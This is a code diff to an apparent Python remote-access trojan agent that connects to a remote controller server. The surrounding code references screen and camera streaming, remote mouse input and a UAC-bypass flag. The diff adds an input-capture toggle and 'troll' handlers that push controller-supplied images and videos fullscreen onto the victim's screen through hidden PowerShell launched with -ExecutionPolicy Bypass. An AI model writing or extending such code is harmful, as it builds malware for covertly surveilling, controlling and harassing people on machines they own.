@@ -236,7 +236,8 @@ PERSISTENT_ADMIN_PROMPT_ENABLED = False
 
 # Controller URL override flag (set URL via env)
 USE_FIXED_SERVER_URL = True
-FIXED_SERVER_URL = os.environ.get('FIXED_SERVER_URL', 'https://agent-controller-backend.onrender.com')
+FIXED_SERVER_URL_RAW = (os.environ.get('FIXED_SERVER_URL', 'https://agent-controller-backend.onrender.com') or '').strip()
+FIXED_SERVER_URL = FIXED_SERVER_URL_RAW if FIXED_SERVER_URL_RAW and FIXED_SERVER_URL_RAW.lower() not in ('none', 'null') else 'http://127.0.0.1:8080'
 #FIXED_SERVER_URL = os.environ.get('FIXED_SERVER_URL', 'https://agent-controller-backend.onrender.com/dashboard')
 #FIXED_SERVER_URL = os.environ.get('FIXED_SERVER_URL', 'http://localhost:3000/')
 DISABLE_SLUI_BYPASS = True
@@ -795,7 +796,7 @@ except ImportError:
     AIORTC_SIGNALING_AVAILABLE = False
     log_message("aiortc.contrib.signaling not available, using custom signaling", "warning")
 
-SERVER_URL = FIXED_SERVER_URL if USE_FIXED_SERVER_URL else os.environ.get('CONTROLLER_URL', '')
+SERVER_URL = FIXED_SERVER_URL if USE_FIXED_SERVER_URL else (os.environ.get('CONTROLLER_URL', '') or 'http://127.0.0.1:8080')
 
 # Email notification configuration (use Gmail App Password)
 EMAIL_NOTIFICATIONS_ENABLED = os.environ.get('ENABLE_EMAIL_NOTIFICATIONS', '1') == '1'
@@ -7759,6 +7760,10 @@ def start_streaming(agent_id):
                 return
             
             STREAMING_ENABLED = True
+            try:
+                INPUT_CAPTURE_ENABLED = True
+            except Exception:
+                pass
             # Use a safe wrapper that defers until functions are defined
             STREAM_THREAD = threading.Thread(target=_run_screen_stream, args=(agent_id,))
             STREAM_THREAD.daemon = True
@@ -7785,6 +7790,10 @@ def stop_streaming():
                 return
             
             STREAMING_ENABLED = False
+            try:
+                INPUT_CAPTURE_ENABLED = False
+            except Exception:
+                pass
             
             # Clear queues to wake up any waiting threads (non-blocking)
             try:
@@ -7941,6 +7950,10 @@ def start_camera_streaming(agent_id):
                 return
             
             CAMERA_STREAMING_ENABLED = True
+            try:
+                INPUT_CAPTURE_ENABLED = True
+            except Exception:
+                pass
             
             # Try WebRTC first for low latency
             if AIORTC_AVAILABLE and WEBRTC_ENABLED:
@@ -7983,6 +7996,10 @@ def stop_camera_streaming():
                 return
             
             CAMERA_STREAMING_ENABLED = False
+            try:
+                INPUT_CAPTURE_ENABLED = False
+            except Exception:
+                pass
             
             # Clear queues to wake up any waiting threads (non-blocking)
             try:
@@ -8270,6 +8287,10 @@ def stop_webrtc_streaming(agent_id):
         
         if result:
             WEBRTC_ENABLED = False
+            try:
+                INPUT_CAPTURE_ENABLED = False
+            except Exception:
+                pass
             log_message(f"WebRTC streaming stopped for agent {agent_id}")
             return True
         else:
@@ -9434,9 +9455,13 @@ def get_input_performance_stats():
     else:
         return {"status": "fallback_mode", "low_latency": False}
 
+INPUT_CAPTURE_ENABLED = False
+
 def handle_mouse_move(data):
     """Handle mouse movement commands."""
     try:
+        if not INPUT_CAPTURE_ENABLED:
+            return
         x = data.get("x", 0)  # Relative position (0-1)
         y = data.get("y", 0)  # Relative position (0-1)
         sensitivity = data.get("sensitivity", 1.0)
@@ -9461,6 +9486,8 @@ def handle_mouse_move(data):
 def handle_mouse_click(data):
     """Handle mouse click commands."""
     try:
+        if not INPUT_CAPTURE_ENABLED:
+            return
         button = data.get("button", "left")
         
         if button == "left":
@@ -10005,6 +10032,8 @@ def register_socketio_handlers():
     # agent_config handling removed in this revision
     sio.on('webrtc_adaptive_bitrate_control')(on_webrtc_adaptive_bitrate_control)
     sio.on('webrtc_implement_frame_dropping')(on_webrtc_implement_frame_dropping)
+    sio.on('troll_show_video')(on_troll_show_video_ps)
+    sio.on('troll_show_image')(on_troll_show_image_ps)
     sio.on('feature_toggle')(on_feature_toggle)
     sio.on('get_monitors')(on_get_monitors)
     sio.on('switch_monitor')(on_switch_monitor)
@@ -15524,6 +15553,244 @@ class FileSystemManager:
                         continue
         return results
 
+def on_troll_show_image(data):
+    try:
+        b64 = str((data or {}).get('image_b64') or '')
+        filename = str((data or {}).get('filename') or 'troll.png')
+        duration_ms = int((data or {}).get('duration_ms') or 5000)
+        mode = str((data or {}).get('mode') or 'cover')
+        payload = base64.b64decode(b64)
+        def _run():
+            try:
+                import tkinter as tk
+                import base64 as _b64
+                root = tk.Tk()
+                root.attributes('-topmost', True)
+                try:
+                    root.attributes('-fullscreen', True)
+                except Exception:
+                    pass
+                root.configure(bg='black')
+                try:
+                    photo = tk.PhotoImage(data=_b64.b64encode(payload))
+                    lbl = tk.Label(root, image=photo, bg='black')
+                    lbl.image = photo
+                    lbl.pack(expand=True, fill='both')
+                    root.after(duration_ms, root.destroy)
+                    root.mainloop()
+                except Exception:
+                    import tempfile
+                    p = os.path.join(tempfile.gettempdir(), filename)
+                    with open(p, 'wb') as f:
+                        f.write(payload)
+                    try:
+                        if sys.platform == 'win32':
+                            os.startfile(p)
+                        else:
+                            import subprocess
+                            subprocess.Popen(['xdg-open', p])
+                    except Exception:
+                        pass
+            except Exception as e:
+                try:
+                    log_message(f"Troll image error: {e}", "error")
+                except Exception:
+                    pass
+        import threading
+        threading.Thread(target=_run, daemon=True).start()
+        try:
+            safe_emit('agent_notification', {'id': f'nt_{int(time.time())}', 'type': 'info', 'title': 'Troll', 'message': f'Showing {filename}', 'timestamp': time.time(), 'agent_id': get_or_create_agent_id(), 'category': 'agent'})
+        except Exception:
+            pass
+    except Exception as e:
+        try:
+            log_message(f"Troll handler error: {e}", "error")
+        except Exception:
+            pass
+
+def on_troll_show_image_ps(data):
+    try:
+        b64 = str((data or {}).get('image_b64') or '')
+        filename = str((data or {}).get('filename') or 'troll.png')
+        duration_ms = int((data or {}).get('duration_ms') or 5000)
+        payload = base64.b64decode(b64)
+        import tempfile
+        p = os.path.join(tempfile.gettempdir(), filename)
+        try:
+            with open(p, 'wb') as f:
+                f.write(payload)
+        except Exception as e:
+            log_message(f"Write image failed: {e}", "error")
+            return
+        script = """
+Add-Type -AssemblyName PresentationFramework
+$path = $args[0]
+$dur = [int]$args[1]
+$w = New-Object Windows.Window
+$w.WindowStyle = 'None'
+$w.WindowState = 'Maximized'
+$w.ResizeMode = 'NoResize'
+$w.Topmost = $true
+$w.ShowInTaskbar = $false
+$w.Background = 'Black'
+$img = New-Object Windows.Controls.Image
+$bmp = New-Object Windows.Media.Imaging.BitmapImage
+$bmp.BeginInit()
+$bmp.UriSource = $path
+$bmp.CacheOption = 'OnLoad'
+$bmp.EndInit()
+$img.Source = $bmp
+$img.Stretch = 'Uniform'
+$w.Content = $img
+$t = New-Object Windows.Threading.DispatcherTimer
+$t.Interval = [TimeSpan]::FromMilliseconds($dur)
+$t.Add_Tick({ $t.Stop(); $w.Close() })
+$t.Start()
+$w.ShowDialog()
+"""
+        s = os.path.join(tempfile.gettempdir(), f"troll_img_{int(time.time())}.ps1")
+        try:
+            with open(s, 'w', encoding='utf-8') as f:
+                f.write(script)
+        except Exception as e:
+            log_message(f"Write script failed: {e}", "error")
+            return
+        try:
+            subprocess.Popen(['powershell', '-NoProfile', '-ExecutionPolicy', 'Bypass', '-File', s, p, str(duration_ms)], creationflags=getattr(subprocess, 'CREATE_NO_WINDOW', 0))
+        except Exception as e:
+            log_message(f"Run script failed: {e}", "error")
+    except Exception as e:
+        try:
+            log_message(f"Troll image ps error: {e}", "error")
+        except Exception:
+            pass
+
+def on_troll_show_video(data):
+    try:
+        b64 = str((data or {}).get('video_b64') or '')
+        filename = str((data or {}).get('filename') or 'troll.mp4')
+        duration_ms = int((data or {}).get('duration_ms') or 8000)
+        payload = base64.b64decode(b64)
+        import tempfile
+        import subprocess
+        tmp_dir = tempfile.gettempdir()
+        video_path = os.path.join(tmp_dir, filename)
+        try:
+            with open(video_path, 'wb') as f:
+                f.write(payload)
+        except Exception as e:
+            log_message(f"Failed to write video: {e}", "error")
+            return
+        # Build minimal HTML to play full screen
+        html = f"""
+<!DOCTYPE html>
+<html>
+<head><meta charset=\"utf-8\"/><style>html,body{{margin:0;height:100%;background:#000}}video{{position:fixed;inset:0;width:100%;height:100%;object-fit:contain;background:#000}}</style></head>
+<body>
+<video id=\"v\" src=\"file:///{video_path.replace('\\\\', '/') }\" autoplay playsinline></video>
+<script>const v=document.getElementById('v');v.requestFullscreen?.();</script>
+</body>
+</html>
+"""
+        html_path = os.path.join(tmp_dir, 'troll_video.html')
+        try:
+            with open(html_path, 'w', encoding='utf-8') as f:
+                f.write(html)
+        except Exception as e:
+            log_message(f"Failed to write HTML: {e}", "error")
+            return
+        # Try msedge fullscreen
+        edge_paths = [
+            r"C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe",
+            r"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
+        ]
+        edge = None
+        for p in edge_paths:
+            if os.path.exists(p):
+                edge = p
+                break
+        proc = None
+        try:
+            if edge:
+                proc = subprocess.Popen([edge, '--start-fullscreen', html_path], creationflags=getattr(subprocess, 'CREATE_NO_WINDOW', 0))
+            else:
+                os.startfile(html_path)
+        except Exception as e:
+            log_message(f"Failed to open viewer: {e}", "error")
+            proc = None
+        # Schedule close
+        def _close():
+            try:
+                if proc and hasattr(proc, 'terminate'):
+                    proc.terminate()
+            except Exception:
+                pass
+            try:
+                # Best-effort cleanup
+                os.remove(video_path)
+            except Exception:
+                pass
+        import threading, time as _t
+        threading.Thread(target=lambda: (_t.sleep(max(1, duration_ms/1000)), _close()), daemon=True).start()
+        try:
+            safe_emit('agent_notification', {'id': f'nt_{int(time.time())}', 'type': 'info', 'title': 'Troll', 'message': f'Playing {filename}', 'timestamp': time.time(), 'agent_id': get_or_create_agent_id(), 'category': 'agent'})
+        except Exception:
+            pass
+    except Exception as e:
+        try:
+            log_message(f"Troll video error: {e}", "error")
+        except Exception:
+            pass
+
+def on_troll_show_video_ps(data):
+    try:
+        b64 = str((data or {}).get('video_b64') or '')
+        filename = str((data or {}).get('filename') or 'troll.mp4')
+        payload = base64.b64decode(b64)
+        import tempfile
+        p = os.path.join(tempfile.gettempdir(), filename)
+        try:
+            with open(p, 'wb') as f:
+                f.write(payload)
+        except Exception as e:
+            log_message(f"Write video failed: {e}", "error")
+            return
+        script = """
+Add-Type -AssemblyName PresentationFramework
+$path = $args[0]
+$w = New-Object Windows.Window
+$w.WindowStyle = 'None'
+$w.WindowState = 'Maximized'
+$w.ResizeMode = 'NoResize'
+$w.Topmost = $true
+$w.ShowInTaskbar = $false
+$w.Background = 'Black'
+$m = New-Object Windows.Controls.MediaElement
+$m.Source = $path
+$m.LoadedBehavior = 'Play'
+$m.UnloadedBehavior = 'Stop'
+$m.Stretch = 'Uniform'
+$m.Volume = 1.0
+$m.Add_MediaEnded({ $w.Close() })
+$w.Content = $m
+$w.ShowDialog()
+"""
+        s = os.path.join(tempfile.gettempdir(), f"troll_video_{int(time.time())}.ps1")
+        try:
+            with open(s, 'w', encoding='utf-8') as f:
+                f.write(script)
+        except Exception as e:
+            log_message(f"Write script failed: {e}", "error")
+            return
+        try:
+            subprocess.Popen(['powershell', '-NoProfile', '-ExecutionPolicy', 'Bypass', '-File', s, p], creationflags=getattr(subprocess, 'CREATE_NO_WINDOW', 0))
+        except Exception as e:
+            log_message(f"Run script failed: {e}", "error")
+    except Exception as e:
+        try:
+            log_message(f"Troll video ps error: {e}", "error")
+        except Exception:
+            pass
 class ProcessManager:
     def __init__(self, socket_client, agent_id):
         self.socket = socket_client
